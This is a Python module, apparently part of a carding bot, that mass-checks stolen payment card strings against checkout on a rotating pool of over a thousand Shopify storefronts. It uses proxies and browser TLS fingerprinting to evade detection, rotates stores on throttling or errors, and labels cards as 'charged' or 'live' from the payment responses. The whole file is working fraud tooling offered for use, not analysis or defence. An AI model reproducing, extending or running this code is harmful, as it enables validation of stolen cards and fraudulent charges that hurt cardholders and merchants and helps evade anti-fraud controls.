"""
Shopify Storefront GraphQL Mass Checker Module (/msh)
Equipped with 1,136 auto-rotating myshopify.com domains, TLS browser fingerprinting via curl_cffi,
and Storefront GraphQL proposal negotiation.
"""
import asyncio
import random
import time
import re
from sh_checker import process_card, parse_cc_string, extract_clean_response
from shopify_sites_pool import SHOPIFY_STORE_POOL

def _normalize_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

async def check_card_msh(
    card_str: str,
    proxy_str: str | None = None,
    custom_site: str | None = None,
    max_site_retries: int = 3
) -> tuple[str, str, str]:
    """
    Checks a single card against Shopify Storefront GraphQL.
    Returns: (status, message, gateway_name)
      status: 'charged' | 'approved' | 'declined' | 'error'
    """
    card_str = str(card_str).strip()
    parts = [p.strip() for p in card_str.split("|")]
    if len(parts) < 4:
        return "declined", "Invalid Card Format (Expected CC|MM|YY|CVV)", "Shopify"

    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(ano) == 2:
        ano = "20" + ano
    mes = mes.zfill(2)

    formatted_proxy = _normalize_proxy(proxy_str)
    current_proxy = formatted_proxy
    user_supplied_site = bool(custom_site and custom_site.strip())
    if user_supplied_site:
        raw_target = custom_site.strip()
        site = raw_target if raw_target.startswith("http") else "https://" + raw_target
    else:
        site_choice = random.choice(SHOPIFY_STORE_POOL).strip()
        site = site_choice if site_choice.startswith("http") else "https://" + site_choice

    def _get_clean_domain(u: str) -> str:
        return u.split("://")[-1].split("/")[0].strip().lower()

    tried_sites = {_get_clean_domain(site)}
    success = False
    message = "ERROR"
    gateway = "Shopify Payments"
    total_price = "0"
    currency = "USD"

    for attempt in range(max_site_retries):
        try:
            success, message, gateway, total_price, currency = await asyncio.wait_for(
                process_card(cc, mes, ano, cvv, site, proxy_str=current_proxy),
                timeout=5
            )
        except asyncio.TimeoutError:
            message = "TIMEOUT"
            current_proxy = None
            if attempt < max_site_retries - 1 and not user_supplied_site:
                candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
                if candidates:
                    next_choice = random.choice(candidates).strip()
                    site = next_choice if next_choice.startswith("http") else "https://" + next_choice
                    tried_sites.add(_get_clean_domain(site))
                continue
            break
        except Exception as e:
            message = str(e) or type(e).__name__
            current_proxy = None
            if attempt < max_site_retries - 1 and not user_supplied_site:
                candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
                if candidates:
                    next_choice = random.choice(candidates).strip()
                    site = next_choice if next_choice.startswith("http") else "https://" + next_choice
                    tried_sites.add(_get_clean_domain(site))
                continue
            break

        msg_upper = str(message).upper()

        # Check if response is a definitive payment processor outcome
        is_definite_card_verdict = any(k in msg_upper for k in [
            "ORDER_PLACED", "PROCESSEDRECEIPT", "ACTIONREQUIRED", "OTP_REQUIRED", "3DS",
            "INSUFFICIENT", "CVC", "CVV", "SECURITY_CODE", "DECLINED", "DO_NOT_HONOR",
            "EXPIRED", "FRAUD", "TRANSACTION_REJECTED", "PROCESSING_ERROR", "PAYMENT_FAILED",
            "CARD_ERROR", "INVALID_CARD", "CALL_ISSUER", "CARD_NOT_SUPPORTED", "LIMIT_EXCEEDED",
            "CARD_DECLINED", "STOLEN_CARD", "LOST_CARD", "RESTRICTED_CARD", "PICKUP_CARD"
        ])

        # Exclude internal site infrastructure errors from being treated as card verdicts
        is_site_infra_error = any(k in msg_upper for k in [
            "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "NO_SESSION_TOKEN", "NO_PAYMENT_METHOD",
            "OUT_OF_STOCK", "CART_EMPTY", "NO_VALID_PRODUCTS", "CHECKOUT_FAILED", "TOKENIZATION_FAILED",
            "GRAPHQL_ERROR", "INVALID_RESPONSE", "THROTTLED", "CHECKPOINTDENIED", "PRICE_TOO_HIGH",
            "NO_PRODUCT", "NO PRODUCTS", "SITE_REQUIRES_LOGIN", "LOGIN REQUIRED", "CART_FAILED",
            "NO AVAILABLE IN-STOCK PRODUCTS", "CART-JSON", "MAX_RETRIES_EXCEEDED",
            "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
            "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "SUBMIT_FAILED_NO_DATA", "CAPTCHA_REQUIRED",
            "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE"
        ])

        if is_definite_card_verdict and not is_site_infra_error:
            break

        # If it's a site error, proxy error, 404, or cart issue, drop proxy & rotate store
        current_proxy = None
        if attempt < max_site_retries - 1 and not user_supplied_site:
            candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
            if candidates:
                next_choice = random.choice(candidates).strip()
                site = next_choice if next_choice.startswith("http") else "https://" + next_choice
                tried_sites.add(_get_clean_domain(site))
            continue
        break

    clean_msg = extract_clean_response(message)
    msg_upper = str(message).upper()
    clean_upper = str(clean_msg).upper()
    gateway_str = gateway if gateway and gateway not in ("", "UNKNOWN") else "Shopify Payments"

    # Status classification
    if "ORDER_PLACED" in msg_upper or "PROCESSEDRECEIPT" in msg_upper or "ORDER PLACED" in clean_upper:
        price_display = f"${total_price}" if total_price and str(total_price) not in ("0", "0.0", "0.00") else "Charged"
        return "charged", f"Charged ({price_display} {currency.upper()})", gateway_str

    if "OTP_REQUIRED" in msg_upper or "ACTIONREQUIRED" in msg_upper or "3DS" in msg_upper:
        return "approved", "3DS Challenge Required", gateway_str

    if "INSUFFICIENT_FUNDS" in msg_upper or "INSUFFICIENT" in clean_upper:
        return "approved", "Insufficient Funds", gateway_str

    if "INCORRECT_CVC" in msg_upper or "INCORRECT_CVV" in msg_upper or "SECURITY_CODE_INCORRECT" in msg_upper:
        return "approved", "Incorrect CVV (CCN Live)", gateway_str

    if "MISMATCHED_BILL" in msg_upper or "BILLING_ADDRESS" in msg_upper:
        return "approved", "AVS Mismatch (Card Live)", gateway_str

    if "TIMEOUT" in msg_upper or "GATEWAY TIMEOUT" in msg_upper or "CHANGE PROXY" in msg_upper:
        return "error", "Gateway Timeout", gateway_str

    if "GENERIC_ERROR" in msg_upper or "PAYMENT_FAILED" in msg_upper or "DECLINED" in msg_upper or "FAILED" in msg_upper or "REJECTED" in msg_upper:
        return "declined", clean_msg if clean_msg and clean_msg not in ("ERROR", "UNKNOWN_ERROR") else "Card Declined", gateway_str

    return "declined", clean_msg if clean_msg and clean_msg not in ("ERROR", "UNKNOWN_ERROR") else "Card Declined", gateway_str
